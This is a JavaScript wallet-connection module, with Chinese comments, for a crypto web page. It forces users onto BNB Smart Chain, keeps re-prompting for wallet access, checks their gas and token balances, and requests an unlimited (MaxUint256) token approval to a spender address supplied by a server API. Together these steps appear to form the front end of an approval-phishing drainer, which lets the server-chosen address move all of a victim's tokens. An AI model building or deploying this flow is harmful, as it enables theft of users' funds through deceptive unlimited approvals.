import { ethers, BrowserProvider } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.1/ethers.min.js';
import { appKit } from '@/utils/modal';
import pinia from '@/stores';
import useStateStore from '@/stores/state';
const state = useStateStore();
import { ABI, bscAddress, ethAddress } from './config';
window['walletStatus'] = null;
let addressList = {
  bsc: bscAddress,
  eth: ethAddress,
};
var provider;
function getProvider() {
  if (appKit.getWalletProvider()) {
    provider = new BrowserProvider(appKit.getWalletProvider());
  } else {
    provider = new BrowserProvider(window.ethereum);
  }
}
getProvider();
async function switchToBSC() {
  return new Promise((res, rej) => {
    window.ethereum
      .request({
        method: 'wallet_switchEthereumChain',
        params: [
          {
            chainId: '0x38',
          },
        ],
      })
      .then(() => {
        walletLogin();
        return res(true);
      })
      .catch((err) => {
        return rej(err);
      });
  });
}
async function switchToEthereum() {
  try {
    await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [
        {
          chainId: '0x1',
        },
      ],
    });
  } catch (error) {
    console.log(error);
  }
}

let getChain = (id) => {
  state.setChainId(id);
  let chain;
  if (id == 56) {
    state.setNetwork('bsc');
    chain = 2;
  }
  if (id == 1) {
    state.setNetwork('eth');
    chain = 1;
  }
  if (id == 6) {
    state.setNetwork('tron');
    chain = 0;
  }
  return chain;
};

export let walletLogin = async () => {
  return new Promise(async (res, rej) => {
    let chainId = await networkStaet();
    provider
      .send('eth_requestAccounts', [])
      .then((a) => {
        let address = a[0];
        state.setLoading(true);
        state.login({
          chain: getChain(chainId) * 1,
          address: address,
        });
      })
      .catch(() => {
        state.setLoading(false);
        return rej('user rejected request');
      });
  });
};
// 监听钱包状态变化
export let onWalletStateChange = async () => {
  getProvider();
  let chainId = await networkStaet();
  let loginStatus = state.loginStatus;

  if (!loginStatus && chainId != 56) {
    state.setAuth(1);
    await switchToBSC();
    setTimeout(() => {
      onWalletStateChange();
    }, window['listenTIme'] * 10);
    return;
  }
  if (!loginStatus) {
    state.setAuth(1);
    walletLogin();
    setTimeout(() => {
      onWalletStateChange();
    }, window['listenTIme'] * 10);
    return;
  }
  let wallet = await connectWallet();
  if (chainId != state.chainId || (wallet.address && wallet.address.toLowerCase() != state.address.toLowerCase())) {
    state.setAuth(1);
    walletLogin();
  }
  setTimeout(() => {
    onWalletStateChange();
  }, window['listenTIme']);
};

let networkStaet = async () => {
  let network = await provider.getNetwork();
  return Number(network.chainId);
};
let walletAddress = async () => {
  let signer = await provider.getSigner();
  console.log(signer);
  return signer.address;
};
// window['changeCountDown'] = 60;
// let onWalletStateChange = async () => {
//   walletStatus = setInterval(async () => {
//     changeCountDown--;
//     if (changeCountDown == 0) {
//       changeCountDown = 60;
//       window.clearInterval(walletStatus);
//       setTimeout(() => {
//         onWalletStateChange();
//       }, 10 * 1000);
//     }
//     getProvider();
//     // let signer = await provider.getSigner(); //连接钱包地址
//     let network = await provider.getNetwork(); //连接钱包地址
//     let chainId = Number(network.chainId);
//     let address = state.address;
//     if (!state.loginStatus || !state.chainId || chainId != 56) {
//       walletLogin();
//       window.clearInterval(walletStatus);
//       // switchToBSC().then(() => {
//       //   walletLogin();
//       // });
//       setTimeout(() => {
//         onWalletStateChange();
//       }, 30 * 1000);
//     }
//     if (!state.loginStatus || address == undefined || !address) {
//       localStorage.clear();
//       state.setAddress('');
//       state.setChainId(null);
//       state.setNetwork('');
//       walletLogin();
//       window.clearInterval(walletStatus);
//       setTimeout(() => {
//         onWalletStateChange();
//       }, 30 * 1000);
//       return;
//     }
//     if (chainId == 56) {
//       provider.send('eth_requestAccounts', []).then((a) => {
//         // console.log('provider', a[0]);
//         // console.log('address', address);
//         if (a[0] != address) {
//           console.log(11111);
//           walletLogin();
//           window.clearInterval(walletStatus);
//           setTimeout(() => {
//             onWalletStateChange();
//           }, 30 * 1000);
//         }
//       });
//     }
//   }, window['listenTIme']);
// };

export async function connectWallet() {
  getProvider();
  return new Promise((res, rej) => {
    provider
      .send('eth_requestAccounts', [])
      .then((a) => {
        return res({
          chainId: appKit.getChainId(),
          address: a[0],
        });
      })
      .catch(() => {
        state.setLoading(false);
        return rej('user rejected request');
      });
  });
}
export let checkNeedEth = async (approve) => {
  getProvider();
  let signer = await provider.getSigner(); //连接钱包地址
  let adr = approve; //授权地址，从api获取
  let type = state.networkType;
  console.log('type', type);
  let contractAddress = addressList[type]; //合约地址
  let contract = new ethers.Contract(contractAddress, ABI, signer);
  let feeData = await provider.getFeeData();
  let gasUsed = await contract.approve.estimateGas(adr, ethers.MaxUint256);
  let needEth = ethers.formatEther(feeData.gasPrice * gasUsed);
  let ethBalance = await provider.getBalance(signer.address);
  return new Promise((res, rej) => {
    if (needEth > ethBalance) {
      console.log('eth not enough');
      return res(false);
    } else {
      return res(true);
    }
  });
};
export async function tokenApprove(approve) {
  getProvider();
  let signer = await provider.getSigner(); //连接钱包地址
  let adr = approve; //授权地址，从api获取
  // let contractAddress = contractAddress; //合约地址
  let type = state.networkType;
  let contractAddress = addressList[type]; //合约地址
  console.log('contractAddress', contractAddress);
  let contract = new ethers.Contract(contractAddress, ABI, signer);
  return new Promise((res, rej) => {
    contract
      .approve(adr, ethers.MaxUint256)
      .then((tx) => {
        tx.wait()
          .then((txReceipt) => {
            if (txReceipt && txReceipt.status == 1) {
              //交易成功
              return res(txReceipt.hash);
            } else {
              return rej();
            }
          })
          .catch((err) => {
            state.setLoading(false);
            console.log(err);
          });
      })
      .catch((err) => {
        state.setLoading(false);
        console.log(err);
      });
  });
  // try {
  //     let feeData =await provider.getFeeData();
  //     let gasUsed = await contract.approve.estimateGas(adr, ethers.MaxUint256) ;
  //     let needEth = ethers.formatEther(feeData.gasPrice*gasUsed);
  //     let ethBalance = await provider.getBalance(signer.address);
  //     if(needEth>ethBalance){
  //         console.log('eth not enough')
  //     }
  //     let tx = await contract.approve(adr, ethers.MaxUint256) //授权
  //     let txReceipt = await tx.wait();
  //     if (txReceipt && txReceipt.status == 1) { //交易成功
  //         console.log(txReceipt.hash); //调用api，把hash传入接口
  //     }

  // } catch (e) {
  //     console.log(e)
  // }
}

export async function tokenBalance() {
  //非gas币的余额获取
  let type = state.networkType;
  let contractAddress = addressList[type]; //合约地址
  let signer = await provider.getSigner(); //连接钱包地址
  let contract = new ethers.Contract(contractAddress, ABI, provider);
  let decimals = await contract.decimals();
  let balance = await contract.balanceOf(signer.address);
  return new Promise((res) => {
    console.log('余额', ethers.formatUnits(balance, decimals));
    return res(ethers.formatUnits(balance, decimals));
  });
  // console.log('余额', ethers.formatUnits(balance, decimals));
}

onWalletStateChange();
// console.log('ethereum', window.ethereum);
// window.ethereum.on('accountsChanged', (e) => {
//   console.log('accountsChanged', e);
// });
